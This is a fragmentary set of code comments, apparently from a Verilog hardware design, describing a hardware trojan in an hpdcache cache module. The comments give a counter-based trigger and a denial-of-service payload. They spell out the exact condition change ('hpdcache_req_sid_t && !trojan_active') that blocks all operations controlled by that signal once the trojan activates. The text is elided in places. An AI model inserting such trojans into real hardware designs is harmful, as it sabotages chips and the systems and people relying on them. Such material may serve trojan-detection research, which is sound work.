 ...
 * 
 * Description:
 *   Disables operations by blocking hpdcache_req_sid_t control signal
 *   
 * Trigger: Counter on hpdcache_req_sid_t
 * Payload: Block hpdcache_req_sid_t when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block hpdcache_req_sid_t when trojan is active
//
// IMPORTANT: hpdcache_req_sid_t is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (hpdcache_req_sid_t && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: hpdcache_req_sid_t && 0 = 0 (always false)
//   All operations controlled by hpdcache_req_sid_t are blocked
